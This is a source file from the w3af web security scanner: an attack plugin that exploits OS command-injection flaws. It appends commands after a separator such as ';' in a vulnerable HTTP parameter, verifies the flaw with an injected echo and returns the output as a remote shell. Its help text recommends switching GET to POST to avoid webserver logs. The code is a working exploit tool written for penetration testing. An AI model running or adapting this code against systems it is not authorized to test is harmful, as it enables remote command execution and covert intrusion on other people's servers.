'''
os_commanding.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

# options
from core.data.options.opt_factory import opt_factory
from core.data.options.option_list import OptionList

from core.data.kb.exec_shell import ExecShell
from core.data.fuzzer.utils import rand_alpha

from core.controllers.plugins.attack_plugin import AttackPlugin
from core.controllers.exceptions import w3afException
import core.controllers.output_manager as om

from plugins.attack.payloads.decorators.exec_decorator import exec_debug


class os_commanding(AttackPlugin):
    '''
    Exploit OS Commanding vulnerabilities.

    @author: Andres Riancho (andres.riancho@gmail.com)
    '''

    def __init__(self):
        AttackPlugin.__init__(self)

        # User configured parameter
        self._change_to_post = True
        self._url = 'http://host.tld/'
        self._separator = ';'
        self._data = ''
        self._inj_var = ''
        self._method = 'GET'

    def fast_exploit(self):
        '''
        Exploits a web app with os_commanding vuln, the settings are configured using set_options()
        '''
        raise w3afException('Not implemented.')

    def get_attack_type(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''
        return 'shell'

    def get_kb_location(self):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.os_commanding plugin finds an vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding ( attack.os_commanding ) should
        return 'os_commanding' in this method.
        '''
        return ['os_commanding',]

    def _generate_shell(self, vuln):
        '''
        @param vuln: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as a parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verify_vuln(vuln):

            if vuln.get_method() != 'POST' and self._change_to_post and \
                    self._verify_vuln(self.GET2POST(vuln)):
                msg = 'The vulnerability was found using method GET, but POST is being used'
                msg += ' during this exploit.'
                om.out.console(msg)
                vuln = self.GET2POST(vuln)
            else:
                msg = 'The vulnerability was found using method GET, tried to change the method to'
                msg += ' POST for exploiting but failed.'
                om.out.console(msg)

            # Create the shell object
            shell_obj = OSCommandingShell(vuln)
            shell_obj.set_url_opener(self._uri_opener)
            shell_obj.set_cut(self._header_length, self._footer_length)
            return shell_obj

        else:
            return None

    def _verify_vuln(self, vuln):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        # The vuln was saved to the kb as:
        # kb.kb.append( self, 'os_commanding', v )
        exploitDc = vuln.get_dc()

        # Define a test command:
        rand = rand_alpha(8)
        if vuln['os'] == 'windows':
            command = vuln['separator'] + 'echo ' + rand
            # TODO: Confirm that this works in windows
            rand = rand + '\n\n'
        else:
            command = vuln['separator'] + '/bin/echo ' + rand
            rand = rand + '\n'

        # Lets define the result header and footer.
        func_ref = getattr(self._uri_opener, vuln.get_method())
        exploitDc[vuln.get_var()] = command
        try:
            response = func_ref(vuln.get_url(), str(exploitDc))
        except w3afException, e:
            om.out.error(str(e))
            return False
        else:
            return self._define_exact_cut(response.get_body(), rand)

    def get_options(self):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'URL to exploit with fast_exploit()'
        o1 = opt_factory('url', self._url, d1, 'url')

        d2 = 'HTTP method to use with fast_exploit()'
        o2 = opt_factory('method', self._method, d2, 'string')

        d3 = 'Data to send with fast_exploit()'
        o3 = opt_factory('data', self._data, d3, 'string')

        d4 = 'Variable where to inject with fast_exploit()'
        o4 = opt_factory('injvar', self._inj_var, d4, 'string')

        d5 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        d5 += ' during exploitation.'
        h5 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        h5 += 'during exploitation; this is usefull for not being logged in the webserver logs.'
        o5 = opt_factory(
            'changeToPost', self._change_to_post, d5, 'boolean', help=h5)

        d6 = 'The command separator to be used.'
        h6 = 'In an OS commanding vulnerability, a command separator is used to separate the'
        h6 += ' original command from the customized command that the attacker want\'s to execute.'
        h6 += ' Common command separators are ;, & and |.'
        o6 = opt_factory('separator', self._separator, d6, 'string', help=h6)

        ol = OptionList()
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        ol.add(o6)
        return ol

    def set_options(self, options_list):
        '''
        This method sets all the options that are configured using the user interface
        generated by the framework using the result of get_options().

        @param OptionList: A dictionary with the options for the plugin.
        @return: No value is returned.
        '''
        if options_list['method'].get_value() not in ['GET', 'POST']:
            raise w3afException('Unknown method.')
        else:
            self._method = options_list['method'].get_value()

        self._data = options_list['data'].get_value()
        self._inj_var = options_list['injvar'].get_value()
        self._separator = options_list['separator'].get_value()
        self._url = options_list['url'].get_value()
        self._change_to_post = options_list['changeToPost'].get_value()

    def get_root_probability(self):
        '''
        @return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        '''
        return 0.8

    def get_long_desc(self):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits os commanding vulnerabilities and returns a remote shell.

        Seven configurable parameters exist:
            - changeToPost
            - url
            - method
            - injvar
            - data
            - separator
            - generateOnlyOne
        '''


class OSCommandingShell(ExecShell):

    @exec_debug
    def execute(self, command):
        '''
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        @param command: The command to handle ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        func_ref = getattr(self._uri_opener, self.get_method())
        exploit_dc = self.get_dc()
        exploit_dc[self.get_var()] = self['separator'] + command
        try:
            response = func_ref(self.get_url(), str(exploit_dc))
        except w3afException, e:
            return 'Error "' + str(e) + '" while sending command to remote host. Please try again.'
        else:
            return self._cut(response.get_body())

    def end(self):
        om.out.debug('OSCommandingShell cleanup complete.')

    def get_name(self):
        return 'os_commanding'
